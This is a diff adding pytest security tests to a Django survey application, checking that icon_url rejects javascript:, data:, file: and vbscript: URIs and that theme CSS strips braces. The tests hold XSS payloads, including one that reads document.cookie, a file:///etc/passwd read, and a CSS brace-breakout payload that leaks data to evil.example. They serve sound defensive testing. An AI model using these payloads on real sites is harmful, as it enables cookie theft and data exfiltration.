@@ -809,6 +809,174 @@ def test_survey_style_rejects_javascript_font_css_url(auth_client, survey):
     ), "javascript: URI was stored as font_css_url — must be rejected or stripped"
 
 
+# ===========================================================================
+# 13. icon_url — javascript: / data: protocol injection (F13)
+#
+# survey_style_update stores icon_url raw.  It is rendered in templates as
+# <img src="{{ brand.icon_url }}"> across the public-facing survey detail,
+# thank-you, and survey-closed pages (seen by unauthenticated respondents),
+# plus the dashboard, base.html, admin, and home page.
+#
+# Django's auto-escaping does NOT neutralise `javascript:` or `data:` schemes
+# in src/href attributes — it only escapes <, >, &, ", '.  So a `javascript:`
+# or `data:` URI passes through untouched.  Modern browsers do not execute
+# javascript: in <img src>, but the value crosses a trust boundary
+# (authenticated editor -> unauthenticated respondent) and a future template
+# change (e.g. rendering icon_url in <a href> or <iframe>) would turn this
+# into a live XSS.
+#
+# The fix: validate icon_url at write time, mirroring the existing
+# font_css_url validation.  Allow http://, https://, and relative paths
+# starting with `/`.  Reject everything else (javascript:, data:, file:, etc.).
+# ===========================================================================
+
+
+@pytest.mark.django_db
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "javascript:alert(document.cookie)",
+        "JaVaScRiPt:alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+        "data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+",
+        "file:///etc/passwd",
+        "vbscript:msgbox(1)",
+    ],
+)
+def test_survey_style_rejects_dangerous_icon_url(auth_client, survey, payload):
+    """
+    F13: survey_style_update must not store a javascript:/data:/file:/vbscript:
+    URI as icon_url.  Only http://, https://, and relative paths starting
+    with `/` are accepted.
+    """
+    auth_client.post(
+        reverse("surveys:style_update", kwargs={"slug": survey.slug}),
+        data={"icon_url": payload},
+    )
+    survey.refresh_from_db()
+    stored = (survey.style or {}).get("icon_url", "")
+    # The dangerous scheme must not survive into storage.
+    scheme = payload.split(":", 1)[0].lower()
+    assert scheme not in stored.lower(), (
+        f"{scheme}: URI was stored as icon_url — must be rejected; got: {stored!r}"
+    )
+    assert ":" not in stored or stored.lower().startswith(
+        ("http://", "https://")
+    ), f"icon_url must be http(s):// or a relative path; got: {stored!r}"
+
+
+@pytest.mark.django_db
+@pytest.mark.parametrize(
+    "payload", ["https://example.com/logo.png", "http://example.com/logo.png"])
+def test_survey_style_accepts_safe_icon_url(auth_client, survey, payload):
+    """F13: legitimate http(s):// icon URLs must be accepted."""
+    auth_client.post(
+        reverse("surveys:style_update", kwargs={"slug": survey.slug}),
+        data={"icon_url": payload},
+    )
+    survey.refresh_from_db()
+    assert (survey.style or {}).get("icon_url") == payload
+
+
+@pytest.mark.django_db
+def test_survey_style_accepts_relative_icon_url(auth_client, survey):
+    """F13: relative paths (starting with /) are legitimate for self-hosted icons."""
+    auth_client.post(
+        reverse("surveys:style_update", kwargs={"slug": survey.slug}),
+        data={"icon_url": "/static/favicon.ico"},
+    )
+    survey.refresh_from_db()
+    assert (survey.style or {}).get("icon_url") == "/static/favicon.ico"
+
+
+@pytest.mark.django_db
+def test_survey_style_icon_url_not_rendered_as_javascript_on_take_page(
+    client, owner, org
+):
+    """
+    F13 (defence in depth): even if a javascript: URI were stored via a path
+    that bypasses the write-time validator (admin, import, legacy data), the
+    public survey take page must not render it raw in a way that a browser
+    would execute.  We assert the dangerous scheme is not present in the
+    rendered <img src> attribute.
+    """
+    survey = Survey.objects.create(
+        owner=owner,
+        organization=org,
+        name="Icon URL Take Test",
+        slug="icon-url-take",
+        status=Survey.Status.PUBLISHED,
+        visibility=Survey.Visibility.PUBLIC,
+    )
+    survey.style = {"icon_url": "javascript:alert(document.cookie)"}
+    survey.save(update_fields=["style"])
+
+    resp = client.get(reverse("surveys:take", kwargs={"slug": survey.slug}))
+    assert resp.status_code == 200
+    assert b"javascript:alert" not in resp.content, (
+        "javascript: URI rendered raw in <img src> on public survey page — "
+        "icon_url must be sanitised at read time as defence in depth"
+    )
+
+
+# ===========================================================================
+# 14. theme_css_* — `}` breakout via sanitize_css_block (F16)
+#
+# survey.style.theme_css_light / theme_css_dark are rendered inside a
+# [data-theme="..."] { ... } rule with |safe.  sanitize_css_block is the
+# read-time guard.  It must strip `}` so a malicious editor cannot close the
+# wrapping rule and inject new CSS rules (e.g. background-image exfiltration).
+# ===========================================================================
+
+
+# Payload that closes the wrapping rule and injects a new exfiltration rule.
+CSS_BRACE_BREAKOUT = "} [data-theme='custom'] { background: url(https://evil.example/?leak=) }"
+
+
+@pytest.mark.django_db
+def test_survey_style_css_brace_breakout_not_in_dashboard(auth_client, survey):
+    """
+    F16: a `}` payload stored in survey.style.theme_css_light must not appear
+    raw in the survey dashboard page.  sanitize_css_block must strip the brace
+    so the wrapping [data-theme] rule cannot be closed early.
+    """
+    survey.style = {"theme_css_light": CSS_BRACE_BREAKOUT}
+    survey.save(update_fields=["style"])
+
+    resp = auth_client.get(reverse("surveys:dashboard", kwargs={"slug": survey.slug}))
+    assert resp.status_code == 200
+    # The closing brace that would break out of the wrapping [data-theme]
+    # rule must be stripped, so the attacker cannot form a new CSS rule.
+    assert b"} [data-theme" not in resp.content, (
+        "Raw `}` breakout payload found in dashboard — sanitize_css_block did "
+        "not strip curly braces from theme_css_light"
+    )
+    # The exfiltration `background: url(...)` rule must not be formed.  With
+    # braces stripped the attacker's payload collapses to bare text inside
+    # the wrapping rule's value context; `background: url(...)` cannot be a
+    # property declaration there because it is not preceded by `;` or `{`.
+    # We assert the full exfiltration declaration is not present as a
+    # usable CSS statement.
+    assert b"background: url(https://evil.example" not in resp.content
+
+
+@pytest.mark.django_db
+def test_survey_style_css_brace_breakout_not_in_builder(auth_client, survey, owner):
+    """F16: same brace-breakout guard on the group_builder page."""
+    from checktick_app.surveys.models import QuestionGroup
+
+    group = QuestionGroup.objects.create(name="Brace Test Group", owner=owner)
+    survey.question_groups.add(group)
+    survey.style = {"theme_css_light": CSS_BRACE_BREAKOUT}
+    survey.save(update_fields=["style"])
+
+    resp = auth_client.get(
+        reverse("surveys:group_builder", kwargs={"slug": survey.slug, "gid": group.id})
+    )
+    assert resp.status_code == 200
+    assert b"} [data-theme" not in resp.content
+
+
 @pytest.mark.django_db
 def test_survey_style_rejects_data_uri_font_css_url(auth_client, survey):
     """
